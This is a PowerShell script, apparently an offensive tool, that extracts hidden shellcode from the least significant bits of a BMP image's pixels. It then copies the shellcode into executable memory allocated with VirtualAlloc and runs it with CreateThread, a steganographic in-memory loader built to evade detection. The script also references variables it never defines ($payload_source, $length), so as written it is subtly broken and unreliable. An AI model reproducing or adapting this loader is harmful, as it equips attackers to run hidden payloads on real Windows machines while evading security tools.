[string] $image_source = "./samples/shellcode/shellcode_x64.bmp"
[Int32] $byte_length = 276

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

function GetLsb([byte]$target, [byte]$source) {
    $a = $target -shl 1
    $b = $source -band 1
    $a -bor $b
}

function Read($BitMap, $length) {
    [Int32]$pos = 0
    $bytes = New-Object byte[] ($length)
    $bit_length = $length * 8

    foreach($y in (0..($BitMap.Height-1))) {
        foreach($x in (0..($BitMap.Width-1))) {
            $Pixel = $BitMap.GetPixel($x,$y)
            $R = $Pixel | Select-Object -ExpandProperty R
            $G = $Pixel | Select-Object -ExpandProperty G
            $B = $Pixel | Select-Object -ExpandProperty B


            foreach ($byte in ($R, $G, $B)) {
                if ($bit_length -le 0) {
                    return $bytes
                }

                $idx = [int][Math]::Floor($pos / 8)
                $bytes[$idx] = GetLsb $bytes[$idx] $byte

                $pos += 1
                $bit_length -= 1
            }
        }
    }
}


$BitMap = [System.Drawing.Image]::FromFile((Get-Item $payload_source).fullname, $true)

$payload_data = Read $BitMap $length

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")
$MethodDefinition ='[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(UInt32 a, UInt32 b, IntPtr c, IntPtr d, UInt32 e, UInt32 f);[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);'

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru


[IntPtr]$ptr = $Kernel32::VirtualAlloc(0, [int][Math]::Floor($length), 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($payload_data, 0, $ptr, [int][Math]::Floor($length))
$Kernel32::CreateThread(0, 0, $ptr, 0, 0, 0)


Start-Sleep -s 3
